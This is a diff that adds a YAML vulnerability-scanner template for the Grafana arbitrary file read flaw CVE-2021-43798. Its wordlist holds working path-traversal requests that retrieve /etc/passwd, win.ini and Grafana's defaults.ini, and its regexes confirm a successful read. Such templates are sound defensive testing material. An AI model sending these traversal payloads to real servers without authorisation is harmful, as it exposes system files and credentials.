@@ -1,0 +1,65 @@
+id: GRAFANA_FILE_READ
+info:
+  name: "Grafana Arbitrary File Read"
+  description: "This vulnerability allows an attacker to access files on the server where Grafana is running. By exploiting this flaw, attackers can potentially read sensitive files outside the intended scope, such as configuration files or system credentials, leading to further compromise of the system. This vulnerability affects specific versions of Grafana, which require prompt patching to mitigate."
+  details:  "This vulnerability occurs when improperly validated input allows an attacker to specify and access arbitrary file paths on the server. This flaw can be exploited by sending specially crafted requests to the affected Grafana instance. As a result, attackers can access sensitive files and system information that are typically restricted, posing a significant security risk to the affected environment."
+  impact: "The impact of this vulnerability is severe, as it allows attackers to access sensitive files on the server, such as configuration files, credentials, and other critical data. Exploiting this flaw can lead to unauthorized access, data breaches, or further exploitation of the system, ultimately compromising the security and integrity of the affected environment."
+  category:
+    name: SM
+    shortName: Misconfiguration
+    displayName: Security Misconfiguration (SM)
+  subCategory: GRAFANA_FILE_READ
+  severity: MEDIUM
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
+  cwe:
+    - CWE-200
+    - CWE-16
+  cve:
+    - CVE-2021-43798
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+  url:
+    extract: urlVar
+  request_headers:
+    for_one:
+      key:
+        eq: "host"
+      value:
+        extract: hostHeaderVal
+wordLists:
+  paths:
+    - '/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd'
+    - '/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini'
+    - '/public/plugins/alertlist/../../../../../conf/defaults.ini'
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "${paths}"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    regex:
+      - 'root:.*:0:([0-9]+):'
+      - '\/tmp\/grafana\.sock'
+      - '\[(fonts|extensions|Mail|files)\]'
+  response_headers:
+    for_one:
+      key:
+        eq: "content-type"
+      value:
+        eq: "text/plain"
